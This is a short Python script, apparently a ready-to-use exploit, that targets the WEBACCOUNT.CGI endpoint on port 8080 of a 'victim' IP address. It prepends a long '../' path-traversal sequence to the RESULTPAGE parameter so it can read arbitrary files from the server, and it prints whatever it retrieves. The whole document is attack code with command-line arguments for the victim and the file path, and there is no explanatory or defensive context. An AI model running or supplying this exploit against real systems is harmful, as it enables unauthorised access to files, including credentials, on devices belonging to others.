import argparse
import requests

def exploit_target(victim_ip, custom_file_path):
    exploit_url = f"http://{victim_ip}:8080/WEBACCOUNT.CGI"
    
    # Automatically prepend ../../../../../..
    full_file_path = "../../../../../../../" + custom_file_path
    
    payload = {
        "OkBtn": "++Ok++",
        "RESULTPAGE": f"..{full_file_path}",
        "USEREDIRECT": "1",
        "WEBACCOUNTID": "",
        "WEBACCOUNTPASSWORD": "",
    }

    try:
        response = requests.get(exploit_url, params=payload)
        if response.status_code == 200:
            print("Exploit Successful. Response Content:")
            print(response.text)
        else:
            print(f"Exploit Failed. Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Custom File Path Exploiter")
    parser.add_argument("victim_ip", help="Victim's IP address")
    parser.add_argument("custom_file_path", help="Custom file path")

    args = parser.parse_args()

    exploit_target(args.victim_ip, args.custom_file_path)
